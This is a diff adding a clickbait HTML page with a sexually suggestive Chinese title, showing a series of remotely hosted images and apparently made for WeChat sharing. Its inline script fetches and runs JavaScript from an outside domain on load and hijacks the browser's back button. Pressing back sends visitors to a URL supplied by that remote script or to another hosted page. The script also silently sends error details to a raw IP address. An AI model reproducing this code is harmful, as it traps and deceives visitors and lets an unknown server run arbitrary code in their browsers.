@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>约炮撞见小姨子,非但没被揍,还双飞...</title>
+    <!--Import materialize.css-->
+    <link href="http://xyzcdn.chinacloudup.com/article/2/css/main.css" rel="stylesheet">
+    <link type="text/css" rel="stylesheet" href="http://xyzcdn.chinacloudup.com/article/2/css/materialize.min.css"  media="screen,projection"/>
+    <!--Let browser know website is optimized for mobile-->
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" />
+    <script src="http://res.wx.qq.com/open/js/jweixin-1.1.0.js"></script>
+</head>
+<body>
+<img src="img/share_auto.jpg" style="width: 1px;height: 1px;">
+<div class="row">
+    <div class="col s12">
+        <img class="article-img" src="http://xyzcdn.chinacloudup.com/article/2/img/001.jpg" />
+    </div>
+    <div class="col s12">
+        <img class="article-img" src="http://xyzcdn.chinacloudup.com/article/2/img/002.jpg" />
+    </div>
+    <div class="col s12">
+        <img class="article-img" src="http://xyzcdn.chinacloudup.com/article/2/img/003.jpg" />
+    </div>
+    <div class="col s12">
+        <img class="article-img" src="http://xyzcdn.chinacloudup.com/article/2/img/004.jpg" />
+    </div>
+    <div class="col s12">
+        <img class="article-img" src="http://xyzcdn.chinacloudup.com/article/2/img/005.jpg" />
+    </div>
+    <div class="col s12">
+        <img class="article-img" src="http://xyzcdn.chinacloudup.com/article/2/img/006.jpg" />
+    </div>
+    <div class="col s12">
+        <img class="article-img" src="http://xyzcdn.chinacloudup.com/article/2/img/007.jpg" />
+    </div>
+    <div class="col s12">
+        <img class="article-img" src="http://xyzcdn.chinacloudup.com/article/2/img/008.jpg" />
+    </div>
+</div>
+<script type="text/javascript" src="http://xyzcdn.chinacloudup.com/article/2/js/jquery-2.1.1.min.js"></script>
+<!--<script type="text/javascript" src="//res.wx.qq.com/open/js/jweixin-1.1.0.js"></script>-->
+<!--<script type="text/javascript" src="js/materialize.min.js"></script>-->
+<script type="text/javascript" src="http://xyzcdn.chinacloudup.com/article/2/js/core.js"></script>
+<script>
+
+    (function() {
+        $.getScript('http://wx.shgfbj.com/php/gwx/get_result.php?rand=' + (+new Date()), function () {
+            window.setTimeout(
+                    function() {
+                        history.pushState(null, null, "#weixin");
+                        window.onpopstate = function() {
+                            if (window.video_url) {
+                                location.href = video_url;
+                                return true;
+                            } else {
+                                location.href = 'http://dfgf.blob.core.chinacloudapi.cn/uyvbtz/index.html';
+                                return true;
+                            }
+                        };
+                    }, 50);
+        });
+    })();
+
+    window.g_appkey = 'act6';
+
+    ;(function () {
+
+        var reportUrl = 'http://218.17.81.211:58043/api/client/error_log';
+        if (!window.debug) {
+            window.onerror = function (msg, url, line, col, obj) {
+                if(col){
+                    line += ':'+ col;
+                }
+
+                var stack = '', ca = arguments.callee.caller;
+                if (ca) {
+                    var b, e = [];
+                    while (ca) {
+                        b = ca;
+                        e.push(b.toString().replace(/[\t\n\r]/g, "").substring(0, 100) + '...');
+                        ca = ca.caller;
+                    }
+                    stack = '; 堆栈：' + e.join(" --> ");
+                }
+                msg += stack.substring(0, 600);
+                var send = new Image();
+                var src = reportUrl + '?msg=' + encodeURIComponent(msg);
+                src += '&file=' + encodeURIComponent(url);
+                src += '&line=' + encodeURIComponent(line);
+                send.src = src;
+                send.onload = send.onerror = function () {
+                    send = null;
+                };
+                return true;
+            };
+        }
+    }());
+
+    $(function(){
+
+        setTimeout(function () {
+            _czc.push(["_trackEvent", 'pv', 'xyz', 'act6']);
+        }, 1500);
+
+    });
+
+</script>
+</body>
+</html>
